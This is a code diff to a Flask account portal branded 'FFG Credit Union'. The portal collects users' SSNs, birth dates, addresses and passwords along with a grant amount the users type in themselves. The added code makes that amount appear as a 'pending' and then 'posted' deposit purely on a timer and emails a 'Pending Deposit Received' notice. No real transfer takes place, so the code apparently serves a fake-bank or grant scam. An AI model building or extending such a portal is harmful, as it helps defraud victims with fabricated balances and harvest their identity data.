@@ -4,6 +4,7 @@ import psycopg2.extras
 import random
 import datetime
 import os
+import requests
 from werkzeug.security import generate_password_hash, check_password_hash
 
 # =========================================================
@@ -17,7 +18,7 @@ account_bp = Blueprint(
 )
 
 # =========================================================
-# DATABASE CONFIGURATION (PostgreSQL)
+# DATABASE CONFIGURATION
 # =========================================================
 DATABASE_URL = os.environ.get("DATABASE_URL")
 
@@ -30,6 +31,8 @@ def get_db_connection():
 def init_db():
     conn = get_db_connection()
     cur = conn.cursor()
+
+    # Base table (original)
     cur.execute("""
         CREATE TABLE IF NOT EXISTS users (
             id SERIAL PRIMARY KEY,
@@ -42,19 +45,31 @@ def init_db():
             grant_amount NUMERIC,
             account_last4 TEXT,
             signup_date TEXT,
-            application_number TEXT
+            application_number TEXT,
+
+            -- NEW (safe additions)
+            deposit_status TEXT DEFAULT 'SCHEDULED',
+            pending_at TIMESTAMP,
+            available_at TIMESTAMP,
+            email_sent BOOLEAN DEFAULT FALSE
         );
     """)
+
     conn.commit()
     cur.close()
     conn.close()
 
-# INITIALIZE DATABASE ON APP START (safe for Render + Neon)
 try:
     init_db()
 except Exception as e:
     print("Database init skipped:", e)
 
+# =========================================================
+# MAILGUN CONFIG
+# =========================================================
+MAILGUN_API_KEY = os.environ.get("MAILGUN_API_KEY")
+MAILGUN_DOMAIN = os.environ.get("MAILGUN_DOMAIN")
+MAILGUN_SENDER = os.environ.get("MAILGUN_SENDER")
 
 # =========================================================
 # HELPERS
@@ -76,6 +91,50 @@ def validate_captcha(user_input):
     session.pop('captcha_answer', None)
     return valid
 
+def send_pending_email(user):
+    html = render_template(
+        "emails/pending_deposit.html",
+        first_name=user["full_name"].split()[0],
+        amount=f"{user['grant_amount']:,.2f}",
+        available_at=user["available_at"].strftime("%B %d, %Y at %I:%M %p")
+    )
+
+    requests.post(
+        f"https://api.mailgun.net/v3/{MAILGUN_DOMAIN}/messages",
+        auth=("api", MAILGUN_API_KEY),
+        data={
+            "from": MAILGUN_SENDER,
+            "to": user["email"],
+            "subject": "Pending Deposit Received – FFG Credit Union",
+            "html": html
+        }
+    )
+
+def process_deposit_state(user, cur):
+    now = datetime.datetime.utcnow()
+
+    # Move to PENDING
+    if user["deposit_status"] == "SCHEDULED" and user["pending_at"] and now >= user["pending_at"]:
+        cur.execute("""
+            UPDATE users
+            SET deposit_status='PENDING'
+            WHERE id=%s
+        """, (user["id"],))
+
+        if not user["email_sent"]:
+            send_pending_email(user)
+            cur.execute("""
+                UPDATE users SET email_sent=TRUE WHERE id=%s
+            """, (user["id"],))
+
+    # Move to POSTED
+    if user["deposit_status"] == "PENDING" and user["available_at"] and now >= user["available_at"]:
+        cur.execute("""
+            UPDATE users
+            SET deposit_status='POSTED'
+            WHERE id=%s
+        """, (user["id"],))
+
 # =========================================================
 # ROUTES
 # =========================================================
@@ -91,17 +150,29 @@ def index():
     cur = conn.cursor()
     cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))
     user = cur.fetchone()
-    cur.close()
-    conn.close()
 
     if not user:
+        cur.close()
+        conn.close()
         session.clear()
         return redirect('/account/login')
+
+    process_deposit_state(user, cur)
+    conn.commit()
+
+    available_balance = user["grant_amount"] if user["deposit_status"] == "POSTED" else 0
+    current_balance = user["grant_amount"] if user["deposit_status"] in ("PENDING", "POSTED") else 0
+
+    cur.close()
+    conn.close()
 
     return render_template(
         'index.html',
         user_name=user['full_name'],
         grant_amount=f"{user['grant_amount']:,.2f}",
+        available_balance=f"{available_balance:,.2f}",
+        current_balance=f"{current_balance:,.2f}",
+        deposit_status=user["deposit_status"],
         account_last4=user['account_last4'],
         signup_date=user['signup_date'],
         application_number=user['application_number'],
@@ -130,23 +201,31 @@ def signup():
         grant_amount = float(request.form['grant_amount'])
         application_number = request.form['application_number']
 
+        signup_time = datetime.datetime.utcnow()
+        pending_at = signup_time + datetime.timedelta(minutes=15)
+        available_at = (signup_time + datetime.timedelta(days=1)).replace(hour=9, minute=0, second=0)
+
         conn = get_db_connection()
         cur = conn.cursor()
+
         try:
             cur.execute("""
                 INSERT INTO users (
                     full_name, email, password, dob, address, ssn,
-                    grant_amount, account_last4, signup_date, application_number
-                ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+                    grant_amount, account_last4, signup_date,
+                    application_number, pending_at, available_at
+                ) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)
                 RETURNING id
             """, (
                 name, email, password, dob, address, ssn,
                 grant_amount, generate_account_last4(),
-                datetime.datetime.now().strftime("%b %d, %Y"),
-                application_number
+                signup_time.strftime("%b %d, %Y"),
+                application_number, pending_at, available_at
             ))
+
             user_id = cur.fetchone()['id']
             conn.commit()
+
         except psycopg2.errors.UniqueViolation:
             conn.rollback()
             cur.close()
@@ -211,6 +290,7 @@ def login():
         captcha_question=create_captcha(),
         show_bottom_nav=False
     )
+
 
 # ----- Profile -----
 @account_bp.route('/profile')
